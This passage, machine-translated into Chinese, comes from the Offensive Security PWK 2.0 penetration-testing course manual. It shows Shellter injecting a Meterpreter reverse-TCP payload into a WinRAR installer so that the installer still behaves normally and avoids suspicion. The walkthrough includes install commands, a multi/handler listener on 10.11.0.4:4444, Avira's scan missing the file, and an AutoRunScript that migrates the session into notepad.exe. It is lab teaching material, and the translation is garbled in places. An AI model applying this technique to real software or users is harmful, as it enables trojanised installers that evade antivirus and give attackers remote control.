<div style="position:absolute;top:75506;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过 AV 引擎。</font><font style="vertical-align: inherit;">其中包括更改 PE 文件部分权限、创建新部分以及</font></font></nobr></div>
<div style="position:absolute;top:75525;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">很快。</font></font></nobr></div>
<div style="position:absolute;top:75558;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后，Shellter 尝试使用现有的 PE 导入地址表 (IAT) </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">434</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">条目来定位</font></font></nobr></div>
<div style="position:absolute;top:75578;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将用于内存分配、传输和执行有效负载的函数。</font></font></nobr></div>
<div style="position:absolute;top:75610;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有了一些理论知识，让我们尝试使用以下方法绕过我们当前的防病毒软件</font></font></nobr></div>
<div style="position:absolute;top:75630;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">壳牌。</font><font style="vertical-align: inherit;">我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">apt</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Kali 中安装 Shellter </font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:75664;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">apt-cache search shellter</font></font></font></b></nobr></div>
<div style="position:absolute;top:75681;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shellter - 动态 shellcode 注入工具和动态 PE 感染器</font></font></nobr></div>
<div style="position:absolute;top:75716;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo apt install shellter</font></font></font></b></nobr></div>
<div style="position:absolute;top:75735;left:338"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 509 - 在 Kali Linux 中安装 shellter</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:75764;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于 Shellter 被设计为在 Windows 操作系统上运行，因此我们还将安装</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wine</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">435</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> a</font></font></nobr></div>
<div style="position:absolute;top:75784;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">兼容层能够在多个 POSIX 兼容的操作系统上运行 win32 应用程序</font></font></nobr></div>
<div style="position:absolute;top:75803;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:75838;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">apt install wine</font></font></font></b></nobr></div>
<div style="position:absolute;top:75857;left:345"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 510 - 在 Kali Linux 中安装 wine</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:75887;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安装</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所有东西后，</font><font style="vertical-align: inherit;">在终端中</font><font style="vertical-align: inherit;">运行</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">shellter</font></font></b><font style="vertical-align: inherit;">将为我们提供一个新的控制台</font></font></nobr></div>
<div style="position:absolute;top:75906;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在酒下运行。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:76019;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">432 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（darkoperator，2012），https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py</font></font></font></nobr></div>
<div style="position:absolute;top:76039;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">433 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Shellter，2019 年），https://www.shellterproject.com</font></font></font></nobr></div>
<div style="position:absolute;top:76059;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">434 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Portable_Executable#Import_Table</font></font></font></nobr></div>
<div style="position:absolute;top:76079;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">435 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://www.winehq.org/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:76207;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="65"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 65 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:76240;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:77317;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:77317;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:77317;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">506</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:76697;left:362"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 269：初始 shellter 控制台。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:76728;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Shellter 可以在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自动</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">手动</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模式下运行。</font><font style="vertical-align: inherit;">在手动模式下，该工具将启动我们想要的 PE</font></font></nobr></div>
<div style="position:absolute;top:76747;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于注入并允许我们在更细粒度的级别上对其进行操作。</font><font style="vertical-align: inherit;">我们可以使用这种模式</font></font></nobr></div>
<div style="position:absolute;top:76767;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">高度自定义注入过程，以防自动选择的选项失败。</font></font></nobr></div>
<div style="position:absolute;top:76799;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然而，为了这个例子的目的，我们将通过在自动模式下选择“A”来运行 Shellter。</font></font></nobr></div>
<div style="position:absolute;top:76819;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">迅速的。</font></font></nobr></div>
<div style="position:absolute;top:76852;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们必须选择一个目标 PE。</font><font style="vertical-align: inherit;">Shellter 将分析和改变执行流程以注入和</font></font></nobr></div>
<div style="position:absolute;top:76871;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行我们的有效载荷。</font><font style="vertical-align: inherit;">对于此示例，我们将使用 32 位试用版可执行安装程序，用于流行的</font></font></nobr></div>
<div style="position:absolute;top:76891;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WinRAR </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">436</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">实用程序作为我们的目标 PE。</font></font></nobr></div>
<div style="position:absolute;top:76923;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在以任何方式分析和更改原始 PE 之前，Shellter 将首先创建文件的备份：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:77267;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">436 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（RARLAB，2019），https://www.rarlab.com/download.htm</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:77395;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="66"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 66 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:77428;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:78505;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:78505;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:78505;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">507</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:77885;left:262"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 270：在 shellter 中选择目标 PE 并执行备份</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:77916;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦 Shellter 找到合适的位置来注入我们的有效载荷，它就会询问我们是否要启用</font></font></nobr></div>
<div style="position:absolute;top:77935;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Stealth Mode</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">437</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将在我们的有效载荷完成后尝试恢复 PE 的执行流程</font></font></nobr></div>
<div style="position:absolute;top:77955;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">被处决。</font><font style="vertical-align: inherit;">我们将选择启用隐形模式，因为我们希望 WinRAR 安装程序能够</font></font></nobr></div>
<div style="position:absolute;top:77974;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正常行为，以避免任何怀疑。</font></font></nobr></div>
<div style="position:absolute;top:78007;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此时，我们会看到可用负载列表。</font><font style="vertical-align: inherit;">这些包括流行的选择</font></font></nobr></div>
<div style="position:absolute;top:78026;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如meterpreter，但Shellter 也支持自定义有效载荷。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:78455;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">437 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Shellter，2019 年），https://www.shellterproject.com/faq/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:78583;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="67"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 67 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:78616;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:79693;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:79693;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:79693;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">508</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:79073;left:324"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 271：shellter 中可用的有效载荷列表</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:79104;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，为了通过 Stealth Mode 选项恢复执行流程，自定义有效负载</font></font></nobr></div>
<div style="position:absolute;top:79124;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要通过退出当前线程来终止。</font></font></nobr></div>
<div style="position:absolute;top:79156;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">鉴于 Avira 检测到我们之前生成的 Meterpreter PE，我们将使用相同的有效负载</font></font></nobr></div>
<div style="position:absolute;top:79175;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于测试 Shellter 绕过功能的设置。</font><font style="vertical-align: inherit;">选择有效载荷后，我们会看到</font></font></nobr></div>
<div style="position:absolute;top:79195;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Metasploit 的默认选项，例如反向 shell 主机 (LHOST) 和端口 (LPORT)：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:79589;left:350"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 272：shellter 中的有效负载选项</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:79620;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置好所有参数后，Shellter 会将有效载荷注入 WinRAR 安装程序并尝试</font></font></nobr></div>
<div style="position:absolute;top:79640;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到达有效载荷的第一条指令。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:79771;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="68"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 68 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:79804;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:80881;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:80881;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:80881;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">509</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:80261;left:342"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 273：shellter 验证注入</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:80292;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在测试成功了，在将恶意 PE 文件传输到我们的 Windows 客户端之前，</font></font></nobr></div>
<div style="position:absolute;top:80312;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将在 Kali 机器上配置一个监听器来与 Meterpreter 负载交互。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:80346;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示选项</font></font></font></b></nobr></div>
<div style="position:absolute;top:80380;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块选项（exploit/multi/handler）：</font></font></nobr></div>
<div style="position:absolute;top:80414;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称 当前设置 必需 描述</font></font></nobr></div>
<div style="position:absolute;top:80431;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---- --------------- -------- -----------</font></font></nobr></div>
<div style="position:absolute;top:80482;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效负载选项（windows/meterpreter/reverse_tcp）：</font></font></nobr></div>
<div style="position:absolute;top:80516;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称 当前设置 必需 描述</font></font></nobr></div>
<div style="position:absolute;top:80533;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---- --------------- -------- -----------</font></font></nobr></div>
<div style="position:absolute;top:80550;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">退出线程    </font></font></nobr></div>
<div style="position:absolute;top:80550;left:328"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 退出技术（接受：''、seh、线程、进程</font></font></nobr></div>
<div style="position:absolute;top:80567;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机 10.11.0.4    </font></font></nobr></div>
<div style="position:absolute;top:80567;left:328"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 监听地址</font></font></nobr></div>
<div style="position:absolute;top:80584;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口 4444    </font></font></nobr></div>
<div style="position:absolute;top:80584;left:328"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是监听端口</font></font></nobr></div>
<div style="position:absolute;top:80635;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用目标：</font></font></nobr></div>
<div style="position:absolute;top:80669;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">身份证名称</font></font></nobr></div>
<div style="position:absolute;top:80686;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- - -</font></font></nobr></div>
<div style="position:absolute;top:80703;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 通配符目标</font></font></nobr></div>
<div style="position:absolute;top:80753;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用</font></font></font></b></nobr></div>
<div style="position:absolute;top:80788;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 在 10.11.0.4:4444 上启动反向 TCP 处理程序 </font></font></nobr></div>
<div style="position:absolute;top:80807;left:284"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 511 - 为 Meterpreter 有效负载设置处理程序 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:80959;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="69"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 69 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:80992;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:82069;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:82069;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:82069;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">510</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:81088;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们将使用 Avira 手动扫描生成的文件：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:81401;left:305"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 274：使用 Avira 扫描恶意 PE 文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:81432;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于 Shellter 在注入之前混淆了有效载荷和有效载荷解码器</font></font></nobr></div>
<div style="position:absolute;top:81451;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进入 PE，Avira 的基于签名的扫描干净地运行。</font><font style="vertical-align: inherit;">它不考虑二进制恶意。</font></font></nobr></div>
<div style="position:absolute;top:81484;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦我们执行文件，我们就会看到默认的 WinRAR 安装窗口，它将</font></font></nobr></div>
<div style="position:absolute;top:81503;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正常安装软件没有任何问题。</font><font style="vertical-align: inherit;">回顾我们的处理程序表明我们</font></font></nobr></div>
<div style="position:absolute;top:81523;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成功接收到一个 Meterpreter 会话，但该会话在安装后似乎消失了</font></font></nobr></div>
<div style="position:absolute;top:81542;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要么完成要么被取消：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:81577;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 发送阶段（179779 字节）到 10.11.0.22</font></font></nobr></div>
<div style="position:absolute;top:81594;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter session 3 打开</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(10.11.0.4:4444 -&gt; 10.11.0.22:51367)</font></font></nobr></div>
<div style="position:absolute;top:81628;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仪表盘 &gt; </font></font></nobr></div>
<div style="position:absolute;top:81645;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 10.11.0.22 - Meterpreter 会话 3 关闭。</font><font style="vertical-align: inherit;">原因：死了</font></font></nobr></div>
<div style="position:absolute;top:81664;left:324"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 512 - 接收 Meterpreter 会话</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:81693;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这是有道理的，因为安装程序的执行已经完成并且过程已经完成</font></font></nobr></div>
<div style="position:absolute;top:81713;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">终止。</font><font style="vertical-align: inherit;">为了克服这个问题，我们可以设置一个</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AutoRunScript</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来迁移我们的</font></font></nobr></div>
<div style="position:absolute;top:81732;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会话创建后立即将 Meterpreter 转换为单独的进程。</font><font style="vertical-align: inherit;">如果我们重新运行 WinRAR</font></font></nobr></div>
<div style="position:absolute;top:81752;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在对我们的侦听器实例进行此更改后的 setup 文件中，我们应该收到不同的结果：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:81786;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 AutoRunScript post/windows/manage/migrate</font></font></font></b></nobr></div>
<div style="position:absolute;top:81804;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AutoRunScript =&gt; post/windows/manage/migrate</font></font></nobr></div>
<div style="position:absolute;top:81837;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用</font></font></font></b></nobr></div>
<div style="position:absolute;top:81871;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 在 10.11.0.4:4444 上启动反向 TCP 处理程序 </font></font></nobr></div>
<div style="position:absolute;top:81888;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 发送阶段（179779 字节）到 10.11.0.22</font></font></nobr></div>
<div style="position:absolute;top:81905;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter 会话 4 打开</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(10.11.0.4:4444 -&gt; 10.11.0.22:51371)</font></font></nobr></div>
<div style="position:absolute;top:81922;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 会话 ID 4 (10.11.0.4:4444 -&gt; 10.11.0.22:51371)</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">处理 AutoRunScript 'post/w</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:81939;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">indows/管理/迁移'</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:81956;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 针对 DESKTOP-T27O4CT 运行模块</font></font></nobr></div>
<div style="position:absolute;top:81973;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 当前服务器进程：wrar550.exe (4036)</font></font></nobr></div>
<div style="position:absolute;top:81990;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 生成要迁移到的 notepad.exe 进程</font></font></nobr></div>
<div style="position:absolute;top:82007;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 迁移到 4832 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:82147;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="70"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 70 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:82180;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:83257;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:83257;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
